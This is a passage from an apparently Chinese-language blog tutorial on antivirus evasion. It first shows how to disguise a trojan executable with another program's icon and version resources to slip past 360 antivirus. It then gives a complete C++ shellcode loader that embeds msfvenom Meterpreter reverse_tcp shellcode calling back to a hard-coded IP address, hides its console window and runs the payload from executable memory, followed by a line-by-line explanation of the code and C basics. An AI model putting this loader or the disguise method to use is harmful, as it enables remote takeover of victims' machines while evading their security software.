<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209150858295.png" alt="image-20220915085838916" style="zoom:30%;" /></li>
</ul>
</blockquote>
<h3 id="过360"><a href="#过360" class="headerlink" title="过360"></a>过360</h3><p>修改资源&#x2F;修改图标：</p>
<blockquote>
<ul>
<li>restorator 下载地址：<a target="_blank" rel="noopener" href="https://www.jb51.net/softs/619405.html">https://www.jb51.net/softs/619405.html</a></li>
<li><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-501557-1-1.html">聊聊Restorator的天坑 - 『脱壳破解区』 - 吾爱破解 </a></li>
</ul>
<p>restorator 用于修改可执行程序的图标界面版本等信息，直接拖进来即可操作.</p>
<p>这个软件还是小心使用~~</p>
<p>可能出现的问题：</p>
<blockquote>
<ul>
<li>若是无法创建 可能是源文件的问题~重新生成木马试试</li>
<li>加壳后可能无法创建成功</li>
</ul>
</blockquote>
</blockquote>
<p>使用 restorator  给 木马exe  执行程序添加图标、界面、版本等资源信息，然后保存。即可过360。</p>
<p>将木马程序和伪造的目标程序拖进来，将目标程序的资源都复制给木马程序~~</p>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209171531979.png" alt="image-20220917153107754" style="zoom:50%;" />

<p>再把chrome都移除删掉，然后保存伪造的shellcode.exe~~很逼真</p>
<img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209171614609.png" alt="image-20220917161407391" style="zoom:50%;" />

<p>在任务管理器中：</p>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209171631847.png" alt="image-20220917163103657"></p>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209171632222.png" alt="image-20220917163220053"></p>
<p>另外 msinfo32查看进程，查看其是否成功的替换信息，有了版本信息等</p>
<p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209171633380.png" alt="image-20220917163350160"></p>
<h1 id="shellcode-loader"><a href="#shellcode-loader" class="headerlink" title="shellcode loader"></a>shellcode loader</h1><p>为了使我们的 shellcode 加载到内存并执行，我们需要 shellcode 加载器，也就是我们的 shellcode loader ，不同语言 loader 的写法不同。<br>shellcode 这个东西我们明白是一串可执行的二进制，那么我们先通过其他的手段开辟一片拥有可读可写可执行权限的区域放入我们的 shellcode，然后跳转到 shellcode 首地址去执行就行了</p>
<blockquote>
<p>这里怎么理解呢？开辟一片拥有可读可写可执行权限的区域就类似我们定义变量<code>int a；</code>为a申请的一片变量空间，此处不同的地方在于这片区域是具有可执行权限的！</p>
<p>另外怎么开辟呢？我们利用高级语言调用api执行这个操作</p>
</blockquote>
<h1 id="shellcodeLoader-c-x2F-c"><a href="#shellcodeLoader-c-x2F-c" class="headerlink" title="shellcodeLoader-c&#x2F;c++"></a>shellcodeLoader-c&#x2F;c++</h1><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><blockquote>
<p>这串代码的shellcode还是很明显，已经无法免杀，这只是一个简单的shellcode代码。此时我们就只能通过对shellcode进行加密混淆，逃避杀软检测~~下节讲</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)  </span></span><br><span class="line"><span class="comment">//隐藏控制台窗口（一）</span></span><br><span class="line"><span class="comment">// msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=124.223.217.243 lport=4321 -f c</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x31\xd2\x51\x65\x48\x8b\x52\x60\x56\x48\x8b\x52\x18\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41\x51\x8b\x42\x3c\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x4d\x31\xc9\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x0d\xac\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45&quot;</span></span><br><span class="line"><span class="string">&quot;\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;</span></span><br><span class="line"><span class="string">&quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9&quot;</span></span><br><span class="line"><span class="string">&quot;\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\xbc\x02\x00\x1a\x0a\x8b\x9b\x31\x2b\x41\x54\x49\x89\xe4&quot;</span></span><br><span class="line"><span class="string">&quot;\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89&quot;</span></span><br><span class="line"><span class="string">&quot;\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba&quot;</span></span><br><span class="line"><span class="string">&quot;\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5&quot;</span></span><br><span class="line"><span class="string">&quot;\xe8\x93\x00\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\xf8\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;</span></span><br><span class="line"><span class="string">&quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8&quot;</span></span><br><span class="line"><span class="string">&quot;\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68\x00\x40&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2\x56\xff\xd5&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//  void* Memory; //等价于PVOID，无类型指针</span></span><br><span class="line">    PVOID Memory = <span class="literal">NULL</span>; <span class="comment">// P表示指针，PVOID表示 void * 无类型指针</span></span><br><span class="line">    Memory = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="comment">//  ShowWindow(GetConsoleWindow(), SW_HIDE);  //隐藏控制台窗口（二）</span></span><br><span class="line">    <span class="built_in">memcpy</span>(Memory, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">    ((<span class="built_in">void</span>(*)())Memory)();<span class="comment">//跳到shellcode内存起始位置，开始执行shellcode</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="代码详解"><a href="#代码详解" class="headerlink" title="代码详解"></a>代码详解</h2><h3 id="include语法解释"><a href="#include语法解释" class="headerlink" title="include语法解释"></a>include语法解释</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>#include  叫做文件包含命令，用来引入对应的头文件（ .h 文件）。<br>#include  也是C语言预处理命令的一种。<br>#include  的处理过程很简单，就是将头文件的内容插入到该命令所在的位置，从而把头文件和当前源文件连接成一个源文件，这与复制粘贴的效果相同。<br>#include  的用法有两种，如下所示：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdHeader.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;myHeader.h&quot;</span></span></span><br></pre></td></tr></table></figure>

<p>使用尖括号 &lt; &gt; 和双引号 “ “ 的区别在于头文件的搜索路径不同：</p>
<ul>
<li>使用尖括号 &lt; &gt; ，编译器会到系统路径下查找头文件；</li>
<li>而使用双引号 “ “ ，编译器首先在当前目录下查找头文件，如果没有找到，再到系统路径下查找</li>
</ul>
<p>也就是说，使用双引号比使用尖括号多了一个查找路径，它的功能更为强大。<br>前面我们一直使用尖括号来引入标准头文件，现在我们也可以使用双引号了，如下所示：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br></pre></td></tr></table></figure>

<p>stdio.h  和 stdlib.h  都是标准头文件，它们存放于系统路径下，所以使用尖括号和双引号都能够成功引入；<br>而我们自己编写的头文件，一般存放于当前项目的路径下，所以不能使用尖括号，只能使用双引号。</p>
<h3 id="隐藏控制台"><a href="#隐藏控制台" class="headerlink" title="隐藏控制台"></a>隐藏控制台</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)  <span class="comment">//设置连接器选项</span></span></span><br></pre></td></tr></table></figure>

<ol>
<li>控制台应用程序一般都会显示一个控制台窗口（虚拟DOS窗口，就是那种cmd黑窗），但很多时候控制台程序的执行逻辑根本不需要与用户进行交互，所以显示这个难看的窗口纯属多余，那么如何将它屏蔽掉呢？</li>
</ol>
<p>操作系统装载应用程序后，做完初始化工作就转到程序的入口点执行。程序的默认<strong>入口点</strong>实际上是由<strong>连接程序</strong>设置的，不同的连接器选择的<strong>入口函数</strong>也不尽相同。</p>
<p>注意这里涉及到两个词语：入口点和入口函数。&#x2F;subsystem定义入口点，&#x2F;entry定义入口函数</p>
<ol start="2">
<li>具体设置哪个入口点是由连接器的 <code>&quot;/subsystem:&quot;</code>  选项参数确定的，它告诉操作系统如何运行编译生成的 .EXE  文件。</li>
</ol>
<p>可以指定四种方式： CONSOLE | WINDOWS | NATIVE | POSIX  如果这个选项参数的值为 WINDOWS ，则表示该应用程序运行时不需要控制台。</p>
<blockquote>
<p>有关连接器参数选项的详细说明请参考微软文档： <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/cpp/build/reference/subsystem-specify-subsystem?view=msvc-170">&#x2F;SUBSYSTEM（指定子系统） | Microsoft Docs</a></p>
</blockquote>
<ol start="3">
<li>具体的入口函数设置：</li>
</ol>
<blockquote>
<ul>
<li>在VC下，连接器对控制台程序设置的入口函数是 mainCRTStartup ， mainCRTStartup  再调用你自己编写的 main  函数；</li>
<li>在图形用户界面（GUI）程序下，设置的入口函数是 WinMainCRTStartup ， WinMainCRTStartup  调用你自己写的 WinMain  函数。</li>
</ul>
</blockquote>
<ol start="4">
<li><code>#pragma comment</code>的解释</li>
</ol>
<p>#pragma comment是#pragma下的一个子命令，使用注释方式引入库或<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BC%96%E8%AF%91/1258343?fromModule=lemma_inlink">编译</a>目录。</p>
<p>#pragma comment是一个编译器指令，指示Visual C ++在生成的目标文件中留下注释。链接器在处理对象文件时可以读取该注释。</p>
<p>#pragma comment(lib, libname) 告诉链接器将’libname’库添加到库依赖关系列表中，就好像您已经将它添加到项目属性中一样 Linker-&gt;Input-&gt;Additional dependencies</p>
<blockquote>
<p>请参阅MSDN上的<a target="_blank" rel="noopener" href="http://msdn.microsoft.com/en-us/library/7f0aews7(v=vs.120).aspx">#pragma-comment</a></p>
</blockquote>
<h3 id="ShowWindow-和GetConsoleWindow"><a href="#ShowWindow-和GetConsoleWindow" class="headerlink" title="ShowWindow()和GetConsoleWindow()"></a>ShowWindow()和GetConsoleWindow()</h3><p>ShowWindow()该函数可以控制窗口状态，GetConsoleWindow()获取到我们所需要控制的目的窗口的句柄</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ShowWindow</span>(<span class="built_in">GetConsoleWindow</span>(), SW_HIDE);</span><br></pre></td></tr></table></figure>

<p>GetConsoleWindow 函数 检索与调用进程关联的控制台所使用的窗口句柄</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/console/getconsolewindow">https://docs.microsoft.com/zh-cn/windows/console/getconsolewindow</a></p>
</blockquote>
<p>ShowWindow 这个函数设置窗口的可视状态</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow</a></p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数原型：</span></span><br><span class="line"><span class="function">BOOL <span class="title">ShowWindow</span><span class="params">( </span></span></span><br><span class="line"><span class="params"><span class="function">    HWND hWnd, <span class="comment">// 指定要设定窗口的句柄 </span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span> nCmdShow <span class="comment">// 指定窗口显示状态 </span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>参数：hWnd 指定要设定窗口的句柄</li>
<li>参数： nCmdShow 指定了如何显示窗口。</li>
</ul>
<blockquote>
<p>它必须是下列值之一：  </p>
<ul>
<li>SW_HIDE               隐藏窗口并将活动状态传递给其它窗口。 </li>
<li>SW_MINIMIZE           最小化窗口并激活系统列表中的顶层窗口。 </li>
<li>SW_RESTORE            激活并显示窗口。如果窗口是最小化或最大化的，Windows恢复其原来的大小和位置。  </li>
<li>SW_SHOW               激活窗口并以其当前的大小和位置显示。 </li>
<li>SW_SHOWMAXIMIZED      激活窗口并显示为最大化窗口。 </li>
<li>SW_SHOWMINIMIZED      激活窗口并显示为图标。  </li>
<li>SW_SHOWMINNOACTIVE    将窗口显示为图标。当前活动的窗口将保持活动状态。 </li>
<li>SW_SHOWNA             按照当前状态显示窗口。当前活动的窗口将保持活动状态。 </li>
<li>SW_SHOWNOACTIVATE     按窗口最近的大小和位置显示。当前活动的窗口将保持活动状态。</li>
<li>SW_SHOWNORMAL         激活并显示窗口。如果窗口是最小化或最大化的，则Windows恢复它原来的大小和位置。</li>
</ul>
</blockquote>
<h3 id="无符号字节数组"><a href="#无符号字节数组" class="headerlink" title="无符号字节数组"></a>无符号字节数组</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned char buf[] = &quot;\xfc\x48\x83\xe4\xf0\xe8.....&quot;;</span><br></pre></td></tr></table></figure>

<p>无符号字节数组，给全部数组元素赋值，定义数组时可以不给出数组长度。</p>
<h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义一个返回类型为 int  整型的 main()  函数， main  是任何程序执行的起点</p>
<h3 id="无类型指针"><a href="#无类型指针" class="headerlink" title="无类型指针"></a>无类型指针</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  void *Memory; //等价于PVOID，无类型指针</span></span><br><span class="line">    PVOID Memory = <span class="literal">NULL</span>; <span class="comment">// P表示指针，PVOID表示 void * 无类型指针</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">声明一个无类型指针，可以采用以上两种方法</span><br><span class="line">void *Memory; 和 PVOID Memory = NULL;</span><br><span class="line"> P表示指针，PVOID表示 void * 无类型指针</span><br></pre></td></tr></table></figure>

<blockquote>
<p>C指针详解：</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://c.biancheng.net/view/228.html">http://c.biancheng.net/view/228.html</a> </li>
<li><a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/c-pointer-detail.html">https://www.runoob.com/w3cnote/c-pointer-detail.html</a></li>
</ul>
</blockquote>
<h3 id="VirtualAlloc"><a href="#VirtualAlloc" class="headerlink" title="VirtualAlloc"></a>VirtualAlloc</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Memory = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br></pre></td></tr></table></figure>

<ol>
<li>简介</li>
</ol>
<p>简单来说就是分配内存的~~</p>
<p>此函数在调用进程的<strong>虚拟地址空间</strong>中保留或提交页面区域， VirtualAlloc  分配的内存被初始化为零</p>
<p>VirtualAlloc是win32的 <strong>api</strong>  函数，是用来申请动态内存的，动态内存我们可以通俗的理解为，主动式保护内存，可以根据我们自己决定是否存在;</p>
<ol start="2">
<li>函数原型</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">VirtualAlloc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD flAllocationType,</span></span></span><br><span class="line"><span class="params"><span class="function">  DWORD flProtect</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>参数</li>
</ol>
<ul>
<li>IpAddress：指向要分配内存的指定起始地址。一般为null，由系统自己分配</li>
</ul>
<blockquote>
<p>长指针。如果此参数为NULL，则由系统确定将区域分配到的位置。</p>
</blockquote>
<ul>
<li><p>dwSize：指定分配内存的大小（以字节为单位）。将此参数设置为0是错误的。</p>
</li>
<li><p>flAllocationType：指定分配内存的类型</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>值</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>MEM_COMMIT</td>
<td>在内存中或磁盘上的页面文件中为页面的指定区域分配物理存储。尝试提交已提交的页面不会导致功能失败。这意味着可以提交一系列已提交或已取消提交的页面，而不必担心失败。</td>
</tr>
<tr>
<td>MEM_RESERVE</td>
<td>保留进程的虚拟地址空间范围，而不分配物理存储。保留范围在释放之前不能被任何其他分配操作（例如malloc和LocalAlloc函数）使用。保留的页面可以在对VirtualAlloc函数的后续调用中提交。</td>
</tr>
<tr>
<td>MEM_RESET</td>
<td>不支持。</td>
</tr>
<tr>
<td>MEM_TOP_DOWN</td>
<td>在可能的最高地址处分配内存。Windows Mobile中将忽略此标志。</td>
</tr>
</tbody></table>
<ul>
<li>flProtect：访问这块分配内存的权限。</li>
</ul>
<table>
<thead>
<tr>
<th>值</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>PAGE_EXECUTE</td>
<td>启用对页面的提交区域的执行访问。</td>
</tr>
<tr>
<td>PAGE_EXECUTE_READ</td>
<td>启用对页面的提交区域的执行和读取访问。尝试写入提交的区域会导致访问冲突。</td>
</tr>
<tr>
<td>PAGE_EXECUTE_READWRITE</td>
<td>启用对页面的提交区域的执行，读取和写入访问权限。</td>
</tr>
<tr>
<td>PAGE_GUARD</td>
<td>该区域中的页面将成为保护页面。</td>
</tr>
<tr>
<td>PAGE_NOACCESS</td>
<td>禁用对页面的提交区域的所有访问。尝试从提交的区域读取，写入或执行该操作会导致访问冲突异常，称为通用保护（GP）故障。</td>
</tr>
<tr>
<td>PAGE_NOCACHE</td>
<td>不允许缓存页面的提交区域。物理内存的硬件属性应指定为无高速缓存。</td>
</tr>
<tr>
<td>PAGE_READONLY</td>
<td>启用对页面的提交区域的读取访问。尝试写入提交的区域会导致访问冲突。如果系统区分只读访问和执行访问，则在提交区域执行代码的尝试将导致访问冲突。</td>
</tr>
<tr>
<td>PAGE_READWRITE</td>
<td>启用对页面的提交区域的读写访问。</td>
</tr>
</tbody></table>
<ol start="4">
<li>返回值</li>
</ol>
<p>返回页面分配区域的基址表示成功。NULL表示失败。要获取扩展的错误信息，请调用 GetLastError 。</p>
<h4 id="申请虚拟内存"><a href="#申请虚拟内存" class="headerlink" title="申请虚拟内存"></a>申请虚拟内存</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *pMem = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="number">4096</span>, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);</span><br></pre></td></tr></table></figure>

<h4 id="释放虚拟内存。"><a href="#释放虚拟内存。" class="headerlink" title="释放虚拟内存。"></a>释放虚拟内存。</h4><blockquote>
<p>注意：</p>
<ol>
<li>第三个参数一定要用 MEM_RELEASE ,而不能用 MEM_DECOMMIT ;</li>
<li>第二个参数一定要用0。</li>
</ol>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VirtualFree(pMem, 0, MEM_RELEASE);</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/previous-versions/aa908768(v=msdn.10)">https://docs.microsoft.com/zh-cn/previous-versions/aa908768(v=msdn.10)</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41143631/article/details/87808495">https://blog.csdn.net/weixin_41143631/article/details/87808495</a></p>
</blockquote>
<h3 id="memcpy"><a href="#memcpy" class="headerlink" title="memcpy()"></a>memcpy()</h3><p>把shellcode写入内存</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(Memory, buf, <span class="built_in">sizeof</span>(buf));</span><br></pre></td></tr></table></figure>

<p>函数声明：</p>
<p>C 库函数 memcpy  从存储区 str2 复制 n 个字节到存储区 str1。</p>
<p>返回值：该函数返回一个指向目标存储区 str1 的指针。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *<span class="title">memcpy</span><span class="params">(<span class="type">void</span> *str1, <span class="type">const</span> <span class="type">void</span> *str2, <span class="type">size_t</span> n)</span></span></span><br></pre></td></tr></table></figure>

<h3 id="void-Memory"><a href="#void-Memory" class="headerlink" title="((void(*)())Memory)();"></a>((void(*)())Memory)();</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">((<span class="built_in">void</span>(*)())Memory)();</span><br></pre></td></tr></table></figure>

<p>理解 ((void(*)())exec)();</p>
<h4 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h4><p>如果变量 fp  是一个函数指针，那么如何调用 fp  所指向的函数呢？调用方法如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">(*fp)();<span class="comment">// 标准的调用方法</span></span><br><span class="line"><span class="built_in">fp</span>();   <span class="comment">// 简写的调用方法，因为ANSI C标准允许程序员将上式简写</span></span><br></pre></td></tr></table></figure>

<p>因为 fp  是一个函数指针，那么 *fp  就是该指针所指向的函数，所以 (*fp)()  就是调用该函数的方式。</p>
<p>这里用一段代码来理解一下函数指针怎么用：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Max</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span></span>;  <span class="comment">//函数声明</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">int</span> (*p)(<span class="type">int</span>, <span class="type">int</span>);  <span class="comment">//定义一个函数指针</span></span><br><span class="line">    <span class="type">int</span> a, b, c, d;</span><br><span class="line">    p = Max;  <span class="comment">//把函数Max赋给指针变量p, 使p指向Max函数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;please enter a and b:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">    c = <span class="built_in">p</span>(a, b);    <span class="comment">// 通过函数指针调用Max函数</span></span><br><span class="line">    d = (*p)(a, b); <span class="comment">// 这样调用也行</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a = %d\nb = %d\nmax = %d,%d\n&quot;</span>, a, b, c,d);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Max</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>  <span class="comment">//定义Max函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> z;</span><br><span class="line">    <span class="keyword">if</span> (x &gt; y)&#123;</span><br><span class="line">        z = x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        z = y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> z;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">please enter a and b:3 4</span><br><span class="line">a = 3</span><br><span class="line">b = 4</span><br><span class="line">max = 4</span><br></pre></td></tr></table></figure>

<p>上面那段代码中， int (<em>p)(int, int); ，我们定义 p  是一个指向返回值为 int  类型的且有两个 int  类型参数的函数的指针。</em></p>
<p>现在我们搞简单点，如果 fp  是一个指向返回值为 void  类型的函数的指针，那么 (*fp)() 的值应为void ， fp 的声明如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void (*fp)();</span><br></pre></td></tr></table></figure>

<h4 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h4><p>当我们知道如何声明一个给定类型的变量，那么该类型的类型转换符就很容易得到了：把声明中的变量名和声明结尾的分号去掉，再将剩余的部分用括号括起来就行。那么上面的 fp 的声明 void (*fp)();的类型转换符就可以得出来了，如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">(<span class="built_in">void</span> (*)())</span><br><span class="line"><span class="comment">//表示一个 指向返回值为void类型的函数的指针</span></span><br></pre></td></tr></table></figure>

<p>到此为止，我们理解那段最终目标的代码所需要的前置知识已经全部复习完毕。</p>
